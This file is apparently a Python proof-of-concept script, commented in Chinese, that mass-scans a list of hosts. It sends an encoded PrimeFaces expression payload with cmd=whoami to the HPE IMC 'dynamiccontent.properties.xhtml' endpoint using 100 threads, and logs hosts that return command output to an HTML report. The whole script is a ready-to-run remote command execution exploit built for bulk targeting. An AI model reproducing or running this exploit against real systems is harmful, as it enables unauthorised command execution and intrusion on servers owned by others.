# -*- coding: utf-8 -*-
import requests
import sys
import threading
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
success=0
inFileName = "XXX.txt" #目標IP.txt 格式:http://XXX/ or https://xxx/
sem = threading.Semaphore(100) #執行緒數量
bar_len = 60 #進度條長度

def url200(url,origin_url): #POC執行本體
    global success    
    try:            
        headers = {
          'Connection': 'close',
          'Cache-Control': 'max-age=0',
          'sec-ch-ua': '"Chromium"',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
          'Sec-Fetch-Site': 'none',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'zh-CN,zh-TW;q=0.9,zh;q=0.8',
          'Cookie': 'oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui',
          'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami"
        r = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "\\" in r.text:  #條件式
            success += 1  #條件成立成功數+1          
            body = """<br>            
            <a href="%s" target="_blank">%s </a><br>
            %s<br>
            """%(origin_url,origin_url,r.text)  #html寫入
            doc.write(body) 
        
    except Exception as error:
        pass
    finally:
        sem.release() #解鎖這個線程，開始其他線程。
    
    
def run():
    num=1   
    f = open(inFileName) 
    urls_data = f.readlines() #讀取txt內容
    total = str(len(urls_data)) #進度條總數
    for urls in urls_data:
        sem.acquire()
        if urls.find('http'):
            url = "http://" + urls.strip("\n") + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml" #POC網址
            origin_url = "http://" + urls.strip("\n") #原url
        else:
            url = urls.strip("\n") + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml" #POC網址
            origin_url = urls.strip("\n") #原url
        t1 = Thread(target=url200,args=(url,origin_url)) 
        t1.start()
        
        filled_len = int(round(bar_len * (num+1) / float(total))) # 以下為進度條
        percents = round(100.0 * (num+1) / float(total), 1)
        bar = ['='] * filled_len + ['-'] * (bar_len - filled_len)
        sys.stdout.write('[%s] %s%s %s/%s success:%s\r' % (''.join(bar), percents, '%', num, total, success))
        sys.stdout.flush()
        num = num + 1
    t1.join()

    html2 = """
    </div>
    </body>
    </html>"""
    doc.write(html2)
    doc.close()

doc = open("result.html", "a+" ,encoding="UTF-8") #開啟HTML寫入
html1 = """
    <html>
    <head></head>
    <style>
    body {
        background-color: #2b2b2b;
        color: #ccc;
    }
    a {
        background-color: transparent;
        text-decoration: none;
        outline: 0;
    }
    a:link {
        color:#FF0000;
        text-decoration:underline;
    }
    a:visited {
        color:#00FF00;
        text-decoration:none;
    }
    a:hover {
        color:#000000;
        text-decoration:none;
    }
    a:active {
        color:#FFFFFF;
        text-decoration:none;
    }
    </style>
    <body>
    <div>"""
doc.write(html1)

run()
# outFile.close()
